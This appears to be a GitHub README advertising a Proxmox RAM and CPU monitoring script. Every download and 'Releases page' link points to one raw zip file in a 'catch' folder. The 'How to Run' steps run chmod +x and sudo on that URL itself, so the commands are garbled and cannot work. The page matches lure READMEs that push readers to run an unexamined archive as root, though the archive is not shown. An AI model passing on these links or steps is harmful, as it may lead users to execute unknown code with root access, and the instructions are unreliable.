# 🖥 proxmox-ram-monitor - Monitor RAM and CPU Usage Easily

[![Download](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip)](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip)

## 🚀 Getting Started

Welcome! This guide will help you download and run the proxmox-ram-monitor script. This tool helps you check the RAM and CPU usage of your Proxmox host, LXC containers, and QEMU/KVM virtual machines quickly and easily.

## 💾 System Requirements

Before you begin, make sure your system fulfills these requirements:

- A working installation of Proxmox.
- Access to a terminal (e.g., SSH).
- Basic permissions to run scripts.

## 📥 Download & Install

Visit the [Releases page](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip) to download the latest version of the script.

1. Click on the version you wish to download.
2. Download the `https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip` file to your computer.

## 📜 Script Overview

The monitoring script is simple to use and provides valuable insights into your system’s performance. It does the following:

- Shows a composite usage bar indicating memory usage for the host, VMs, and LXC containers.
- Lists a detailed table that includes CPU%, RAM usage, maximum RAM, and the top memory-consuming processes for each instance.
- Provides clear, color-coded output to help you quickly interpret the data.

### 🌟 Features

- Supports both **cgroup v1** and **cgroup v2** for memory tracking.
- Collects usage statistics from:
  - **Host system**
  - **Active LXC containers**
  - **Active QEMU/KVM virtual machines**
- Displays the **top memory-consuming process** for every environment.
- Includes **visual progress bars** for easy memory monitoring.

## ▶️ How to Run

After downloading the script, follow these steps to run it:

1. Open your terminal.
2. Navigate to the directory where the script is saved.
3. Type the following command to give the script execution permission:

   ```bash
   chmod +x https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip
   ```

4. Next, run the script as root:

   ```bash
   sudo https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip
   ```

## 🎨 Understanding the Output

When you run the script, you will see:

1. **Composite Usage Bar**: Indicates overall memory usage on the host.
2. **Detailed Table**: Displays information for each virtual instance, helping you identify which ones are consuming the most resources.
3. **Color Coding**: Helps you quickly understand the usage levels. Green may indicate healthy levels, while red signals critical usage.

## 🔍 Troubleshooting

If you encounter any issues while running the script:

- Ensure that you have the necessary permissions.
- Double-check that you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip).
- Consult the script documentation for known bugs and solutions.

## 💬 Support

For questions or assistance, you can open an issue on the GitHub repository. The community and contributors can provide support and help resolve your problems.

## 📣 Contributing

We welcome contributions! If you'd like to help or suggest improvements, feel free to submit a pull request. Make sure to discuss any major changes with maintainers to ensure a smooth collaboration.

## 📅 Updates

Check back regularly for updates to the script. New features and improvements come from user feedback and community contributions. Always use the latest version to take full advantage of updates.

---

[![Download](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip)](https://raw.githubusercontent.com/Ydvjrjd/proxmox-ram-monitor/main/catch/ram-proxmox-monitor-3.9.zip) 

With proxmox-ram-monitor, keep your system running smoothly with a few simple commands. Happy monitoring!